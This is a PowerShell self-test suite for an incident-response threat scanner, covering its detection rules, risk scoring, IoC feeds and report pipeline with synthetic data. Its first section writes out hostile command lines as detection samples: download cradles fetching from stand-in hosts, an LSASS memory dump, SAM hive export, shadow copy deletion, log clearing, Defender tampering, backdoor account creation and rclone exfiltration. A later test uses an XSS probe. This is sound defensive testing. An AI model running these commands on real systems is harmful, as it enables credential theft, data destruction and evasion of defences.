<#
    Offline self-tests for IR_DeepThreatScan v9.0 (runs on Windows PowerShell 5.1 or PowerShell 7, incl. Linux/macOS).
    Validates the rule engine, risk scoring, correlation and the full report pipeline using synthetic data.

    Usage:  pwsh -File .\tests\Test-DeepThreatScan.ps1 [-OutDir <folder>]
#>
param([string]$OutDir = (Join-Path ([System.IO.Path]::GetTempPath()) 'dts_selftest'))

$ErrorActionPreference = 'Stop'
$scriptPath = Join-Path (Split-Path -Parent $PSScriptRoot) 'IR_DeepThreatScan_v9.0.ps1'
$global:DTS_SkipMain = $true
$env:COMPUTERNAME = 'LAB-WS01'   # fixed name for the generated sample report (this process only)
. $scriptPath -NoOpen

$script:fail = 0; $script:pass = 0
function Assert {
    param([bool]$Condition, [string]$Message)
    if ($Condition) { $script:pass++; Write-Host "  PASS  $Message" -ForegroundColor Green }
    else { $script:fail++; Write-Host "  FAIL  $Message" -ForegroundColor Red }
}

$script:IsAdmin = $true
$script:Prof = $script:ProfileSettings['Standard']
$script:Since = (Get-Date).AddHours(-72)
$script:IocFeedInfo = $null
Initialize-ScanState
Initialize-IocSets
$script:Telemetry.Sysmon = $true; $script:Telemetry.ScriptBlockLogging = $true; $script:Telemetry.CmdLineAudit = $true

Write-Host "`n[1] Rule engine - known-bad command lines" -ForegroundColor Cyan
$cases = [ordered]@{
    'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' = 'Encoded PowerShell command'
    'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x.example/a.ps1'')"'                       = 'PowerShell download cradle (download and execute)'
    'rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full'                                     = 'LSASS memory dump via comsvcs.dll (rundll32 export #24)'
    '"C:\Windows\system32\vssadmin.exe" delete shadows /all /quiet'                                                       = 'Shadow copy deletion'
    'wmic shadowcopy delete'                                                                                              = 'Shadow copy deletion'
    'bcdedit /set {default} recoveryenabled No'                                                                           = 'Windows boot recovery disabled'
    'certutil -urlcache -split -f http://1.2.3.4/p.exe p.exe'                                                             = 'Certutil used to download or decode a payload'
    'reg save HKLM\SAM C:\temp\sam.save'                                                                                  = 'Registry hive dump (SAM / SYSTEM / SECURITY)'
    'wevtutil cl Security'                                                                                                = 'Event log clearing command'
    'p^o^w^e^r^s^h^e^l^l -e^n^c SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'      = 'Encoded PowerShell command'
    'Set-MpPreference -DisableRealtimeMonitoring $true'                                                                   = 'Microsoft Defender tampering'
    'net user backdoor P@ssw0rd! /add'                                                                                    = 'Account created or added to Administrators via command'
    'mshta.exe http://evil.example/x.hta'                                                                                 = 'MSHTA executing remote or inline script'
    'rclone.exe copy C:\Finance remote:bucket'                                                                            = 'Rclone data transfer (possible exfiltration)'
    'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1'      = 'WDigest plaintext credential caching enabled'
}
foreach ($k in $cases.Keys) {
    $titles = @(Test-CommandLine $k | ForEach-Object { $_.Title })
    Assert ($titles -contains $cases[$k]) "$($cases[$k])  <=  $($k.Substring(0, [Math]::Min(60, $k.Length)))"
}

Write-Host "`n[2] Rule engine - benign command lines must not fire High rules" -ForegroundColor Cyan
$benign = @(
    '"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer',
    'C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule',
    'powershell.exe -ExecutionPolicy RemoteSigned -File C:\Scripts\backup.ps1',
    'C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}',
    'msiexec.exe /i C:\Install\agent.msi /qn',
    'certutil -hashfile C:\file.iso SHA256'
)
foreach ($b in $benign) {
    $high = @(Test-CommandLine $b | Where-Object { (Get-RiskLevel $_.Impact $_.Confidence) -in @('High', 'Critical') })
    Assert ($high.Count -eq 0) "no High rule on: $b"
}

Write-Host "`n[3] Self-detection guard - the scanner's own source must not match its rules" -ForegroundColor Cyan
$self = Get-Content -LiteralPath $scriptPath -Raw
$selfHits = @(Test-CommandLine $self | Where-Object { $_.Title -ne 'URL present in command line' })
Assert ($selfHits.Count -eq 0) ("script text matches no behaviour rule (hits: " + (($selfHits | ForEach-Object { $_.Title }) -join '; ') + ")")

Write-Host "`n[4] Risk matrix" -ForegroundColor Cyan
Assert ((Get-RiskLevel 10 10) -eq 'Critical') '10/10 -> Critical'
Assert ((Get-RiskLevel 9 8) -eq 'Critical') '9/8 -> Critical (very-high impact, high confidence)'
Assert ((Get-RiskLevel 8 8) -eq 'High') '8/8 -> High'
Assert ((Get-RiskLevel 10 6) -eq 'Moderate') '10/6 -> Moderate (confidence cap < 7)'
Assert ((Get-RiskLevel 5 4) -eq 'Low') '5/4 -> Low'
Assert ((Get-RiskLevel 2 9) -eq 'Info') '2/9 -> Info'

Write-Host "`n[5] Helpers" -ForegroundColor Cyan
Assert (Test-IsPrivateAddress '10.1.2.3') '10.1.2.3 private'
Assert (Test-IsPrivateAddress '172.20.0.1') '172.20.0.1 private'
Assert (-not (Test-IsPrivateAddress '8.8.8.8')) '8.8.8.8 external'
Assert (Test-IsPrivateAddress 'fe80::1%12') 'fe80:: link-local private'
Assert (-not (Test-IsPrivateAddress '2a00:1450:4001::1')) 'global IPv6 external'
Assert ((Get-ExecutablePath '"C:\Program Files\App\app.exe" /run') -eq 'C:\Program Files\App\app.exe') 'quoted path parsed'
Assert ((Get-ExecutablePath 'C:\Users\bob\AppData\Roaming\upd.exe -silent') -eq 'C:\Users\bob\AppData\Roaming\upd.exe') 'unquoted path parsed'
Assert (Test-UserWritablePath 'C:\Users\bob\AppData\Local\Temp\x.exe') 'AppData\Temp is user-writable'
Assert (-not (Test-UserWritablePath 'C:\Program Files\App\app.exe')) 'Program Files is not user-writable'
Assert ((Get-EditDistance 'svch0st.exe' 'svchost.exe') -eq 1) 'edit distance svch0st'
Assert ((Test-DomainMatch 'cdn.pastebin.com' $script:IocDb.SuspiciousServiceDomains) -eq 'pastebin.com') 'sub-domain matches abused-service list (v8.6 -like bug fixed)'
Assert ($null -eq (Test-DomainMatch 'notpastebin.com' $script:IocDb.SuspiciousServiceDomains)) 'look-alike domain does not match'
$x = @(); $x += Test-IpIoc '1.1.1.1'
Assert (@($x | Where-Object { $_ }).Count -eq 0) 'non-IoC IP yields no reason'
$x = @(Test-IpIoc '45.133.1.145')
Assert ($x.Count -eq 1 -and $x[0].Impact -eq 10) 'built-in C2 IP matches'
$pr = @(Get-ProcessReasons -Image 'C:\Users\bob\AppData\Local\Temp\svchost.exe' -CommandLine '' -ParentImage 'C:\Windows\explorer.exe')
Assert (@($pr | Where-Object { $_.Title -like 'System binary name*' }).Count -eq 1) 'svchost.exe outside System32 detected'
$pr = @(Get-ProcessReasons -Image 'C:\Windows\System32\cmd.exe' -CommandLine 'cmd /c whoami' -ParentImage 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE')
Assert (@($pr | Where-Object { $_.Mitre -eq 'T1204.002' }).Count -eq 1) 'Office -> cmd parent/child rule'
$pr = @(Get-ProcessReasons -Image 'C:\Temp\update.exe' -CommandLine '' -ParentImage '' -OriginalFileName 'mimikatz.exe')
Assert (@($pr | Where-Object { $_.Title -like 'Renamed offensive tool*' }).Count -eq 1) 'renamed mimikatz via OriginalFileName'

Write-Host "`n[5b] IoC feed import" -ForegroundColor Cyan
Import-IocFeed -Path (Join-Path (Split-Path -Parent $PSScriptRoot) 'samples\iocs.example.json')
Initialize-IocSets
Assert (@(Test-IpIoc '203.0.113.66').Count -eq 1) 'feed IP matches'
Assert ($null -ne (Test-DomainIoc 'www.c2.attacker.example')) 'feed domain matches sub-domain'
Assert ($null -ne (Test-ToolName 'evil-loader.exe')) 'feed tool name matches'
$txtFeed = Join-Path ([System.IO.Path]::GetTempPath()) 'dts_feed.txt'
Set-Content -LiteralPath $txtFeed -Value @('# comment', '192.0.2.10', 'evil.example', ('a' * 64))
Import-IocFeed -Path $txtFeed; Initialize-IocSets
Assert (@(Test-IpIoc '192.0.2.10').Count -eq 1 -and $script:HashSet.Contains(('A' * 64))) 'TXT feed auto-detects IP and SHA256'

Write-Host "`n[6] End-to-end report pipeline with a synthetic ransomware + C2 scenario" -ForegroundColor Cyan
$script:State.HostInfo['Computer Name'] = 'LAB-WS01'; $script:State.HostInfo['Operating System'] = 'Windows 11 Enterprise (build 22631)'
Add-PostureCheck 'Telemetry' 'Sysmon' 'Running' 'Good'
Add-PostureCheck 'Hardening' 'LSA protection (RunAsPPL)' 'Not enabled' 'Warning' 'Protects LSASS against credential dumping'
$malPath = 'C:\Users\bob\AppData\Roaming\svch0st.exe'
$procReasons = @(Get-ProcessReasons -Image $malPath -CommandLine "$malPath -k" -ParentImage 'C:\Windows\explorer.exe') + @(New-Reason 'Unsigned process running from a user-writable location' 8 8 'T1036.005' $malPath)
Add-Finding -Category 'Process' -Reasons $procReasons -Entity 'svch0st.exe (PID 4242)' -ProcessId 4242 -Path $malPath -Time (Get-Date).AddHours(-5) -Source 'Live process' -Tags 'process' `
    -Evidence ([ordered]@{ Process = 'svch0st.exe'; PID = 4242; CommandLine = "$malPath -k <script>alert(1)</script>" })
$script:State.Network.Add([PSCustomObject]@{ ProcessId = 4242; Process = 'svch0st.exe'; Path = $malPath; Remote = '45.133.1.145'; Port = 443; External = $true })
Add-Finding -Category 'Network' -Reasons @(Test-IpIoc '45.133.1.145') -Entity 'svch0st.exe -> 45.133.1.145:443' -ProcessId 4242 -Path $malPath -RemoteIp '45.133.1.145' -Source 'Live TCP connection' -Tags 'c2'
$script:State.PersistenceTargets.Add([PSCustomObject]@{ Mechanism = 'Autorun'; Name = 'HKU\bob\...\Run\Updater'; Path = $malPath })
Add-Finding -Category 'Execution' -Reasons @(Test-CommandLine 'vssadmin.exe delete shadows /all /quiet') -Entity 'vssadmin.exe' -Time (Get-Date).AddHours(-2) -Source 'Security 4688' -Tags 'execution'
Add-Finding -Category 'Ransomware' -Title "Ransom note 'HOW_TO_DECRYPT.txt' found in 14 folder(s)" -Impact 10 -Confidence 10 -Mitre 'T1486' -Entity 'HOW_TO_DECRYPT.txt' -Time (Get-Date).AddHours(-1) -Source 'File system' -Tags 'ransomware'
Add-Finding -Category 'DefenseEvasion' -Title 'Security event log was cleared' -Impact 9 -Confidence 9 -Mitre 'T1070.001' -Entity 'Security log' -Time (Get-Date).AddHours(-3) -Source 'Security 1102' -Tags 'evasion'
Add-Finding -Kind Posture -Category 'Posture' -Title 'SMBv1 server protocol is enabled' -Impact 4 -Confidence 6 -Entity 'SMB1' -Source 'test'
Add-Finding -Category 'Process' -Title 'duplicate check' -Impact 3 -Confidence 3 -DedupeKey 'DUP'
Add-Finding -Category 'Process' -Title 'duplicate check' -Impact 3 -Confidence 3 -DedupeKey 'DUP'
Add-Inventory 'processes' ([ordered]@{ PID = 4242; Name = 'svch0st.exe'; Path = $malPath; Flag = 'High: test' })
$script:State.Coverage.Add([PSCustomObject]@{ Name = 'Get-Test'; Label = 'Synthetic data'; Status = 'OK'; Items = 1; Findings = 6; DurationSec = 0.1; Notes = @('synthetic') })
$script:State.ShadowCopyCount = 0

Assert (@($script:State.Findings | Where-Object { $_.Title -eq 'duplicate check' }).Count -eq 1) 'DedupeKey suppresses duplicates'
$p = $script:State.Findings[0]
Assert ($p.Risk -in @('High', 'Critical')) "process with typosquat + unsigned + user path is $($p.Risk)"

Invoke-Correlation
$corr = @($script:State.Findings | Where-Object { $_.Category -eq 'Correlation' })
Assert (@($corr | Where-Object { $_.Title -like '*communicating with a suspicious endpoint*' }).Count -eq 1) 'C1 process <-> C2 correlation'
Assert (@($corr | Where-Object { $_.Title -like '*persistence launches a flagged binary*' }).Count -eq 1) 'C2 persistence <-> flagged binary correlation'
Assert (@($corr | Where-Object { $_.Title -like 'Ransomware activity pattern*' }).Count -eq 1) 'C4 ransomware pattern correlation'
Assert (@($corr | Where-Object { $_.Title -like 'Defence evasion*' }).Count -eq 1) 'C7 evasion + high-risk correlation'

$model = New-ReportModel
Assert ($model.summary.OverallRisk -eq 'Critical') "overall risk Critical (got $($model.summary.OverallRisk))"
Assert ($model.summary.Headline -like '*RANSOMWARE*') "headline: $($model.summary.Headline)"
Assert ($model.summary.Counts.Low -ge 0 -and $model.summary.PostureFindings -eq 1) 'posture findings counted separately'
Assert (@($model.recommendations).Count -ge 3) "recommendations generated ($(@($model.recommendations).Count))"
Assert (@($model.attack | Where-Object { $_.Tactic -eq 'Impact' -and @($_.Techniques).Count -gt 0 }).Count -eq 1) 'ATT&CK matrix has Impact techniques'

$null = New-Item -ItemType Directory -Force -Path $OutDir
$json = ConvertTo-ReportJson $model
$jsonPath = Join-Path $OutDir 'ThreatScan_TEST.json'
Write-Utf8File -Path $jsonPath -Content $json
$re = $json | ConvertFrom-Json
Assert ($re.findings.Count -eq $model.findings.Count) 'JSON round-trip keeps all findings'
Assert ($json -notmatch '"value":\s*\[') 'no PS 5.1 {value,Count} array wrapping'
$htmlPath = Join-Path $OutDir 'ThreatScan_TEST.html'
Write-HtmlReport -Json $json -Path $htmlPath -Title 'Deep Threat Scan - LAB-WS01 - Critical'
$html = Get-Content -LiteralPath $htmlPath -Raw
Assert ($html -notmatch '<script>alert') 'HTML-injection payload from host data is neutralised'
Assert ($html -notmatch 'https?://(www\.gstatic|cdn|ajax)') 'no external CDN dependencies'
Assert ($html -match '"OverallRisk":\s*"Critical"') 'report data embedded'
Assert ($html.Contains(([string][char]92) + 'u003cscript') ) 'angle brackets in data are JSON-escaped'
Write-Utf8File -Path (Join-Path $OutDir 'ThreatScan_TEST_ExecutiveSummary.md') -Content (ConvertTo-MarkdownSummary $model)
Export-FindingsCsv -Model $model -Path (Join-Path $OutDir 'ThreatScan_TEST_Findings.csv')
$md = ConvertTo-MarkdownSummary $re
Assert ($md -match 'Overall risk \| \*\*Critical\*\*') 'Markdown summary renders from re-loaded JSON (-ReportFromJson path)'

Write-Host ("`nResult: {0} passed, {1} failed. Sample report: {2}" -f $script:pass, $script:fail, $htmlPath) -ForegroundColor $(if ($script:fail) { 'Red' } else { 'Green' })
if ($script:fail) { exit 1 }
